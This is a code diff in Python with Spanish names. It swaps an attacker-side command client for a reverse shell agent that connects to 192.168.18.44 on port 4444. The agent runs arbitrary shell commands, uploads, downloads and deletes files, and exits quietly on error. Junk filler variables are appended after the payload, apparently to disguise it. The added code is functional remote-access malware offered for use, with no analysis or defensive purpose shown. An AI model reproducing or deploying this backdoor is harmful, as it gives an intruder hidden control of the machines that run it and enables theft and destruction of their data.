@@ -1,68 +1,107 @@
-from socket import socket 
-from os import path
+import socket
+import subprocess
+import json
+import os
+import base64
+import sys 
 
+hola_mundo= "hola a todos"
+ddd= 56
 
+class amigo:
+    def __init__(self, direc, porta):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((direc, porta))
 
-# Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
-server_address = ("", 4444)  #pon  la ip victima
-
-# Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
-client_socket = socket()
-client_socket.connect(server_address)
-estado = True
-
-while estado:
-
-    # Solicitamos al usuario que introduzca un comando
-    comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")
     
+    def reliable_enviar(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
 
-    # Si el usuario introduce "exit", cerramos la conexión y salimos del bucle
-    if comando_enviar == 'exit':
-        # Le decimos al servidor que la conexion la cerramos:
-        client_socket.send(comando_enviar.encode())
-        # Cerramos el socket, que se volverá a abrir al inicio del bucle:
-        client_socket.close()
-        estado = False
-    
-    elif comando_enviar == 'descargar':
-        # Solicitar al usuario que ingrese el nombre del archivo
-        nombre_archivo = input("Introduce el nombre del archivo que deseas descargar: ")
-        # Enviar el nombre del archivo al servidor
-        client_socket.send(nombre_archivo.encode())
-        # Recibir el archivo del servidor y guardarlo en el directorio actual
-        with open(nombre_archivo, 'wb') as archivo_descargado:
-            while True:
-                datos = client_socket.recv(1024)
-                if not datos:
-                    break
-                archivo_descargado.write(datos)
-        print(f"Archivo {nombre_archivo} descargado exitosamente.") 
-        
-    elif comando_enviar == 'enviar':
-        # Solicitar al usuario que ingrese el nombre del archivo
-        nombre_archivo = input("Introduce el nombre del archivo que deseas enviar: ")
-        if path.exists (nombre_archivo):
+    def reliable_recibir(self):
+        json_data = b""
+        while True:
             try:
-            # Abrir el archivo en modo lectura binaria
-                with open(nombre_archivo, "rb") as f:
-                # Leer el contenido del archivo
-                    contenido = f.read()
-            # Enviar el nombre del archivo al servidor
-                client_socket.send(nombre_archivo.encode())
-            # Enviar el contenido del archivo al servidor
-                client_socket.send(contenido)
-                print(f"Archivo {nombre_archivo} enviado exitosamente.")
-            except FileNotFoundError:
-            # Enviar un mensaje de error al cliente si el archivo no existe
-                client_socket.send("El archivo no existe".encode())
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def ejecutar_sistema_comando(self, command):
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
+
+    def cambiar_direct(self, path):
+        os.chdir(path)
+        return "[+] Cambiando el directorio de trabajo a " + path
+
+    def leer_archivo(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode()
+
+    def escribir_archivo(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content.encode()))
+            return "[+] Carga exitosa."
+    def ejecutar_direct(self):
+        current_directory = os.getcwd()
+        files = os.listdir(current_directory)
+        return "\n".join(files)
+    
+    def eliminar_archivo(self, path):
+        try:
+            os.remove(path)
+            return "[+] Archivo eliminado exitosamente."
+        except Exception:
+            return "[-] Error al eliminar el archivo."
+
+    def run(self):
+        while True:
+            accion = self.reliable_recibir()
+
+            try:
+                if accion[0] == "salir":
+                    self.connection.close()
+                    sys.exit()
+                elif accion[0] == "cd" and len(accion) > 1:
+                    resultado = self.cambiar_direct(accion[1])
+                elif accion[0] == "descargar": 
+                    resultado = self.leer_archivo(accion[1])
+                elif accion[0] == "enviar":
+                    resultado = self.escribir_archivo(accion[1], accion[2])
+                elif accion[0] == "dir":
+                    resultado = self.ejecutar_direct()
+                elif accion[0] == "eliminar":
+                    resultado = self.eliminar_archivo(accion[1])
+                else:
+                    resultado = self.ejecutar_sistema_comando(accion)
+            except Exception:
+                resultado = "[-] Error durante la ejecución del comando."
             
-    else:
-        # Enviamos el comando a la máquina víctima:
-        client_socket.send(comando_enviar.encode())
+            self.reliable_enviar(resultado)
 
-        # Esperamos a recibir la respuesta de la víctima y lo guardamos en la variable respuesta.
-        respuesta = client_socket.recv(4096)
+try:
+    amiguito = amigo("192.168.18.44", 4444)
+    amiguito.run()
+except Exception:
+    sys.exit() 
+ 
+xd=123344
+ddd= "44445"
+ffff="hola"
+mundo = "hola mundo"
 
-        # Imprimimos la respuesta;
-        print(respuesta.decode()) 
+variable10 = (1, 2, 3)
+variable11 = "Python"
+variable12 = 42
+variable13 = [4, 5, 6]
+variable14 = 2.71828
+variable15 = "Hola, mundo!"
+variable16 = ["a", "b", "c"]
+variable17 = {"nombre": "Juan", "edad": 25}
+variable18 = 7
+variable19 = 3.14159
+variable20 = [7, 8, 9]
+variable21 = True
+variable22 = "Adiós"
+
